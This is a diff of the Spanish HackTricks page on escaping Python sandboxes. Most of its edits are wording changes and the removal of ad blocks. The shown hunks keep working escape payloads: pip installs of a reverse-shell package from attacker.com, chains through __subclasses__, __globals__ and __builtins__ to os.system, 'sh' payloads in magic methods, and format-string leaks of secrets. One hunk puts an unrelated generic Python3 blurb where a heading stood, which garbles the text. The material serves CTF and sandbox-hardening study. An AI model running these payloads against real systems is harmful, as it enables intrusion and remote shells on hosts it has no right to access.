@@ -1,4 +1,4 @@
-# Saltar los sandbox de Python
+# Saltar las protecciones de las cajas de arena de Python
 
 <details>
 
@@ -9,20 +9,12 @@ Otras formas de apoyar a HackTricks:
 * Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Encuentra vulnerabilidades que son más importantes para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
-Estos son algunos trucos para saltar las protecciones de sandbox de Python y ejecutar comandos arbitrarios.
+Estos son algunos trucos para saltar las protecciones de las cajas de arena de Python y ejecutar comandos arbitrarios.
 
 ## Bibliotecas de Ejecución de Comandos
 
@@ -99,12 +91,12 @@ Si tienes acceso a `pip` o `pip.main()`, puedes instalar un paquete arbitrario y
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Puedes descargar el paquete para crear la shell inversa aquí. Por favor, ten en cuenta que antes de usarlo debes **descomprimirlo, cambiar el `setup.py`, y poner tu IP para la shell inversa**:
+Puedes descargar el paquete para crear el shell inverso aquí. Por favor, ten en cuenta que antes de usarlo debes **descomprimirlo, cambiar el `setup.py`, y poner tu IP para el shell inverso**:
 
 {% file src="../../../.gitbook/assets/reverse.tar.gz" %}
 
 {% hint style="info" %}
-Este paquete se llama `Reverse`. Sin embargo, fue especialmente diseñado para que cuando salgas de la shell inversa, el resto de la instalación falle, de modo que **no dejarás ningún paquete de Python adicional instalado en el servidor** al irte.
+Este paquete se llama `Reverse`. Sin embargo, fue especialmente diseñado para que cuando salgas del shell inverso, el resto de la instalación falle, de modo que **no dejarás ningún paquete de Python adicional instalado en el servidor** al irte.
 {% endhint %}
 
 ## Evaluar código Python
@@ -200,7 +192,7 @@ class _:pass
 ```
 ### RCE creando objetos y sobrecargando
 
-Si puedes **declarar una clase** y **crear un objeto** de esa clase, podrías **escribir/sobrescribir diferentes métodos** que pueden ser **activados** **sin necesidad de llamarlos directamente**.
+Si puedes **declarar una clase** y **crear un objeto** de esa clase, podrías **escribir/sobrescribir diferentes métodos** que pueden ser **activados** **sin** **necesidad de llamarlos directamente**.
 
 #### RCE con clases personalizadas
 
@@ -256,7 +248,7 @@ __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 #### Creación de objetos con [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
-Lo fundamental que nos permiten hacer las metaclasses es **crear una instancia de una clase, sin llamar directamente al constructor**, al crear una nueva clase con la clase objetivo como metaclass.
+Lo fundamental que nos permiten hacer las metaclasses es **crear una instancia de una clase, sin llamar directamente al constructor**, creando una nueva clase con la clase objetivo como metaclass.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -324,14 +316,6 @@ a.__class__.__exit__ = lambda self, *args: None
 with (a as b):
 pass
 ```
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## Funciones integradas
 
 * [**Funciones integradas de python2**](https://docs.python.org/2/library/functions.html)
@@ -344,8 +328,8 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### Sin Builtins
 
-Cuando no tienes `__builtins__`, no podrás importar nada ni siquiera leer o escribir archivos ya que **todas las funciones globales** (como `open`, `import`, `print`...) **no están cargadas**.\
-Sin embargo, **por defecto Python importa muchos módulos en memoria**. Estos módulos pueden parecer inofensivos, pero algunos de ellos **también importan funcionalidades peligrosas** en su interior que pueden ser accedidas para lograr incluso **ejecución de código arbitrario**.
+Cuando no tienes `__builtins__`, no podrás importar nada ni siquiera leer o escribir archivos, ya que **no se cargan todas las funciones globales** (como `open`, `import`, `print`...).\
+Sin embargo, **por defecto Python importa muchos módulos en memoria**. Estos módulos pueden parecer inofensivos, pero algunos de ellos **también importan funcionalidades peligrosas** en su interior a las que se puede acceder para lograr incluso **ejecución de código arbitrario**.
 
 En los siguientes ejemplos puedes observar cómo **abusar** de algunos de estos módulos "**inofensivos**" cargados para **acceder** a **funcionalidades peligrosas** en su interior.
 
@@ -372,7 +356,7 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
 #### Python3
 
-#### Python3
+Python3 es un lenguaje de programación de alto nivel ampliamente utilizado en el desarrollo de aplicaciones. Es conocido por su sintaxis clara y legible, lo que lo hace ideal para principiantes y expertos por igual. Python3 es compatible con múltiples sistemas operativos y plataformas, lo que lo convierte en una opción popular para una variedad de proyectos de software.
 ```python
 # Obtain builtins from a globally defined function
 # https://docs.python.org/3/library/functions.html
@@ -391,7 +375,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**A continuación hay una función más grande**](./#recursive-search-of-builtins-globals) para encontrar **decenas**/**centenas** de **lugares** donde puedes encontrar los **builtins**.
+[**A continuación hay una función más grande**](./#recursive-search-of-builtins-globals) para encontrar decenas/**cientos** de **lugares** donde puedes encontrar los **builtins**.
 
 #### Python2 y Python3
 ```python
@@ -437,11 +421,11 @@ class_obj.__init__.__globals__
 
 ## Descubrir Ejecución Arbitraria
 
-Aquí quiero explicar cómo descubrir fácilmente **más funcionalidades peligrosas cargadas** y proponer exploits más confiables.
+Aquí quiero explicar cómo descubrir fácilmente **funcionalidades más peligrosas cargadas** y proponer exploits más confiables.
 
 #### Accediendo a subclases con bypasses
 
-Una de las partes más sensibles de esta técnica es poder **acceder a las subclases base**. En los ejemplos anteriores, esto se hizo usando `''.__class__.__base__.__subclasses__()`, pero hay **otras formas posibles**:
+Una de las partes más sensibles de esta técnica es poder **acceder a las subclases base**. En los ejemplos anteriores esto se hizo usando `''.__class__.__base__.__subclasses__()`, pero hay **otras formas posibles**:
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -471,7 +455,7 @@ defined_func.__class__.__base__.__subclasses__()
 ```
 ### Encontrar bibliotecas peligrosas cargadas
 
-Por ejemplo, sabiendo que con la biblioteca **`sys`** es posible **importar bibliotecas arbitrarias**, puedes buscar todos los **módulos cargados que hayan importado sys en su interior**:
+Por ejemplo, sabiendo que con la biblioteca **`sys`** es posible **importar bibliotecas arbitrarias**, puedes buscar todos los **módulos cargados que han importado sys dentro de ellos**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
@@ -565,12 +549,11 @@ load_source: NullImporter, _HackedGetData
 execfile:
 execute:
 __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
-"""
 ```
 ## Búsqueda recursiva de Builtins, Globals...
 
 {% hint style="warning" %}
-Esto es simplemente **increíble**. Si estás **buscando un objeto como globals, builtins, open o cualquier cosa**, simplemente usa este script para **encontrar de forma recursiva lugares donde puedes encontrar ese objeto.**
+Esto es simplemente **increíble**. Si estás **buscando un objeto como globals, builtins, open o cualquier cosa**, simplemente usa este script para **encontrar de forma recursiva lugares donde puedas encontrar ese objeto.**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -689,21 +672,13 @@ main()
 ```
 Puedes verificar la salida de este script en esta página:
 
-{% content-ref url="broken-reference" %}
-[Enlace roto](broken-reference)
+{% content-ref url="broken-reference/" %}
+[broken-reference](broken-reference/)
 {% endcontent-ref %}
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+## Cadena de formato en Python
 
-Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
-## Formato de cadena de Python
-
-Si **envías** una **cadena** a Python que va a ser **formateada**, puedes usar `{}` para acceder a **información interna de Python**. Puedes usar los ejemplos anteriores para acceder a globales o builtins, por ejemplo.
+Si **envías** una **cadena** a Python que va a ser **formateada**, puedes usar `{}` para acceder a la **información interna de Python**. Puedes usar los ejemplos anteriores para acceder a globales o builtins, por ejemplo.
 
 {% hint style="info" %}
 Sin embargo, hay una **limitación**, solo puedes usar los símbolos `.[]`, por lo que **no podrás ejecutar código arbitrario**, solo leer información.\
@@ -732,7 +707,7 @@ Ten en cuenta cómo puedes **acceder a atributos** de forma normal con un **punt
 
 También puedes usar `.__dict__` para enumerar elementos de un objeto `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-Algunas otras características interesantes de las cadenas de formato es la posibilidad de **ejecutar** las funciones **`str`**, **`repr`** y **`ascii`** en el objeto indicado agregando **`!s`**, **`!r`**, **`!a`** respectivamente:
+Otras características interesantes de las cadenas de formato es la posibilidad de **ejecutar** las funciones **`str`**, **`repr`** y **`ascii`** en el objeto indicado agregando **`!s`**, **`!r`**, **`!a`** respectivamente:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
@@ -748,7 +723,7 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**Más ejemplos** sobre ejemplos de **formato de cadena** se pueden encontrar en [**https://pyformat.info/**](https://pyformat.info)
+**Más ejemplos** sobre ejemplos de **formato** **string** se pueden encontrar en [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
 Consulte también la siguiente página para encontrar gadgets que **leerán información sensible de objetos internos de Python**:
@@ -789,8 +764,6 @@ else:
 return "Nope"
 ```
 #### dir
-
-La función `dir` en Python se utiliza para obtener una lista de los atributos y métodos de un objeto en particular.
 ```python
 dir() #General dir() to find what we have loaded
 ['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
@@ -799,7 +772,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` y `func_globals` (Igual) Obtiene el entorno global. En el ejemplo se pueden ver algunos módulos importados, algunas variables globales y su contenido declarado:
+`__globals__` y `func_globals` (igual) Obtiene el entorno global. En el ejemplo se pueden ver algunos módulos importados, algunas variables globales y su contenido declarado:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -808,7 +781,7 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
-[**Ver aquí más lugares para obtener los globales**](./#globals-and-locals)
+[**Ver aquí más lugares para obtener globales**](./#globals-and-locals)
 
 ### **Accediendo al código de la función**
 
@@ -1025,7 +998,7 @@ f(42)
 ```
 ## Decompilación de Python compilado
 
-Usando herramientas como [**https://www.decompiler.com/**](https://www.decompiler.com) uno puede **decompilar** el código de Python compilado dado.
+Usando herramientas como [**https://www.decompiler.com/**](https://www.decompiler.com) uno puede **decompilar** el código Python compilado dado.
 
 **Echa un vistazo a este tutorial**:
 
@@ -1033,12 +1006,12 @@ Usando herramientas como [**https://www.decompiler.com/**](https://www.decompile
 [.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
 {% endcontent-ref %}
 
-## Python Variado
+## Misceláneo Python
 
 ### Assert
 
 Python ejecutado con optimizaciones con el parámetro `-O` eliminará las declaraciones de aserción y cualquier código condicional en función del valor de **debug**.\
-Por lo tanto, las comprobaciones como
+Por lo tanto, verificaciones como
 ```python
 def check_permission(super_user):
 try:
@@ -1047,7 +1020,7 @@ print("\nYou are a super user\n")
 except AssertionError:
 print(f"\nNot a Super User!!!\n")
 ```
-serán evadidas
+serán evadidos
 
 ## Referencias
 
@@ -1058,13 +1031,6 @@ serán evadidas
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Encuentra vulnerabilidades que importan más para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
 ***
 
 <details>
@@ -1073,10 +1039,10 @@ Encuentra vulnerabilidades que importan más para que puedas solucionarlas más 
 
 Otras formas de apoyar a HackTricks:
 
-* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
